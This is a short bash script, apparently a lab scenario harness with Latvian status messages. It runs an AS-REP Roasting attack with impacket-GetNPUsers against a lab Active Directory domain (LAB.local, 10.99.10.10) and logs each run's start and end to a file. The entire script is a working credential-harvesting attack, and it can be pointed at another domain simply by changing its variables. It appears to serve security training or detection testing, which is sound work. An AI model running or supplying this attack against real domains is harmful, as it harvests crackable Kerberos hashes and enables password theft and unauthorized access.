#!/bin/bash

set -euo pipefail

DOMAIN="LAB.local/"
DC_IP="10.99.10.10"
USERLIST="${1:-users.txt}"
SCENARIO_ID="${2:-asreproast}"
LOG_FILE="scenario.log"

if [ ! -f "$USERLIST" ]; then
  echo asrep_user > users.txt
fi

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=asrep_roasting,status=start,domain=${DOMAIN},dc_ip=${DC_IP},userlist=${USERLIST}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts AS-REP Roasting scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} DC: ${DC_IP}  Lietotāju saraksts: ${USERLIST}"

impacket-GetNPUsers ${DOMAIN} -no-pass -usersfile ${USERLIST} -dc-ip ${DC_IP}

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=asrep_roasting,status=end,domain=${DOMAIN},dc_ip=${DC_IP},userlist=${USERLIST}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

